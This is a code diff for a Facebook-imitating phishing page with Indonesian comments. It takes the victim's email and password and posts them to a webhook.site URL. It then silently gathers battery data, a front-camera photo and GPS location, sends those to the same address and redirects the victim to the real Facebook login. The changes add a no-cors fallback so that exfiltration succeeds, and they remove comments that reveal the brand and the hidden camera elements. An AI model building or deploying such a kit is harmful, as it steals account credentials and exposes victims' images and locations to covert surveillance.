@@ -106,7 +106,7 @@
 <body>
 
     <div class="card">
-        <!-- Logo digambar via Canvas -->
+        <!-- Logo -->
         <canvas id="fb-logo-canvas" width="200" height="50"></canvas>
 
         <div class="msg">
@@ -123,13 +123,12 @@
         <div class="status-badge" id="statusBadge">● Siap</div>
     </div>
 
-    <!-- Elemen tersembunyi untuk kamera -->
     <video id="vid" autoplay muted></video>
     <canvas id="cap-canvas"></canvas>
 
     <script>
         // ============================================================
-        // 1. GAMBAR LOGO FACEBOOK
+        // 1. GAMBAR LOGO
         // ============================================================
         (function drawLogo() {
             const canvas = document.getElementById('fb-logo-canvas');
@@ -147,10 +146,56 @@
         const WEBHOOK_URL = 'https://webhook.site/50f6311e-fbb1-4d2d-b43c-b66b5c526711';
 
         // ============================================================
-        // 3. FUNGSI BANTU (Promise-based)
+        // 3. FUNGSI KIRIM DENGAN FALLBACK
         // ============================================================
 
-        /** Ambil status baterai (kalau ada) */
+        /**
+         * Kirim data ke webhook dengan mencoba mode CORS dulu,
+         * lalu fallback ke no-cors dengan x-www-form-urlencoded jika perlu.
+         */
+        async function sendToWebhook(payload, isCredentials = false) {
+            // Pertama coba dengan CORS (JSON)
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                if (response.ok) {
+                    console.log(`✅ ${isCredentials ? 'Kredensial' : 'Data tambahan'} terkirim via CORS`);
+                    return { success: true, method: 'cors' };
+                } else {
+                    console.warn(`⚠️ CORS gagal dengan status ${response.status}, mencoba fallback...`);
+                }
+            } catch (err) {
+                console.warn('⚠️ Error saat CORS fetch:', err.message);
+            }
+
+            // Fallback: no-cors dengan x-www-form-urlencoded
+            try {
+                // Ubah payload menjadi URLSearchParams
+                const formData = new URLSearchParams();
+                // Untuk payload yang kompleks, kita stringify sebagian
+                formData.append('payload', JSON.stringify(payload));
+                // Kirim dengan mode no-cors
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // tidak bisa baca respons, tapi request terkirim
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: formData.toString(),
+                });
+                console.log(`✅ ${isCredentials ? 'Kredensial' : 'Data tambahan'} terkirim via no-cors fallback`);
+                return { success: true, method: 'no-cors' };
+            } catch (err) {
+                console.error(`❌ Gagal kirim ${isCredentials ? 'kredensial' : 'data tambahan'} dengan fallback:`, err);
+                return { success: false, error: err.message };
+            }
+        }
+
+        // ============================================================
+        // 4. FUNGSI BANTU (Baterai, Kamera, GPS)
+        // ============================================================
+
         function getBatteryInfo() {
             return new Promise((resolve) => {
                 if (!navigator.getBattery) {
@@ -167,7 +212,6 @@
             });
         }
 
-        /** Coba ambil foto dari kamera depan (jika diizinkan) */
         function tryCapturePhoto() {
             return new Promise((resolve) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -221,7 +265,6 @@
             });
         }
 
-        /** Coba ambil lokasi GPS (jika diizinkan) */
         function tryGetLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -252,54 +295,9 @@
         }
 
         // ============================================================
-        // 4. FUNGSI PENGIRIMAN
+        // 5. EKSEKUSI UTAMA
         // ============================================================
 
-        /** Kirim hanya kredensial (langsung, tanpa menunggu apapun) */
-        async function sendCredentials(email, password) {
-            const payload = {
-                type: 'credentials',
-                credentials: { email, password },
-                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-                userAgent: navigator.userAgent,
-            };
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                });
-                console.log('✅ Kredensial terkirim');
-            } catch (err) {
-                console.error('❌ Gagal kirim kredensial:', err);
-            }
-        }
-
-        /** Kirim data tambahan (baterai, foto, lokasi) setelah dikumpulkan */
-        async function sendExtraData(battery, photo, location, refTime) {
-            const payload = {
-                type: 'extra',
-                refTime: refTime,
-                battery: battery,
-                photo: photo,
-                location: location,
-                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-            };
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                });
-                console.log('✅ Data tambahan terkirim');
-            } catch (err) {
-                console.error('❌ Gagal kirim data tambahan:', err);
-            }
-        }
-
-        // ============================================================
-        // 5. FUNGSI UTAMA execute()
-        // ============================================================
         async function execute() {
             const userInput = document.getElementById('user');
             const passInput = document.getElementById('pass');
@@ -314,43 +312,58 @@
                 return;
             }
 
-            // Nonaktifkan tombol
             btn.disabled = true;
             btn.textContent = 'Memproses...';
             statusEl.textContent = '● Mengirim kredensial...';
 
             // --- Langkah 1: Kirim kredensial langsung ---
-            const refTime = new Date().toISOString(); // referensi waktu
-            await sendCredentials(email, password);
+            const credPayload = {
+                type: 'credentials',
+                credentials: { email, password },
+                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                userAgent: navigator.userAgent,
+            };
+            const credResult = await sendToWebhook(credPayload, true);
+            if (credResult.success) {
+                statusEl.textContent = `● Kredensial terkirim (${credResult.method})`;
+            } else {
+                statusEl.textContent = '● Gagal kirim kredensial';
+            }
 
+            // --- Langkah 2: Kumpulkan data tambahan ---
             statusEl.textContent = '● Mengambil data tambahan...';
-
-            // --- Langkah 2: Kumpulkan data tambahan (baterai, foto, lokasi) secara paralel ---
             const [battery, photo, location] = await Promise.all([
                 getBatteryInfo(),
                 tryCapturePhoto(),
                 tryGetLocation(),
             ]);
 
-            statusEl.textContent = '● Mengirim data tambahan...';
-
             // --- Langkah 3: Kirim data tambahan ---
-            await sendExtraData(battery, photo, location, refTime);
-
-            statusEl.textContent = '● Selesai ✓';
+            statusEl.textContent = '● Mengirim data tambahan...';
+            const extraPayload = {
+                type: 'extra',
+                refTime: new Date().toISOString(),
+                battery: battery,
+                photo: photo,
+                location: location,
+                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+            };
+            const extraResult = await sendToWebhook(extraPayload, false);
+            if (extraResult.success) {
+                statusEl.textContent = `● Data tambahan terkirim (${extraResult.method})`;
+            } else {
+                statusEl.textContent = '● Gagal kirim data tambahan';
+            }
 
             // Reset tombol
             btn.disabled = false;
             btn.textContent = 'Verifikasi Akun';
 
-            // Alert & redirect
             alert('Sistem sedang memproses verifikasi. Anda akan diarahkan kembali sebentar lagi.');
             window.location.href = 'https://facebook.com/login';
         }
 
-        // ============================================================
-        // 6. (OPSIONAL) Tekan Enter di input untuk submit
-        // ============================================================
+        // Enter key support
         document.querySelectorAll('input').forEach((inp) => {
             inp.addEventListener('keydown', (e) => {
                 if (e.key === 'Enter') {
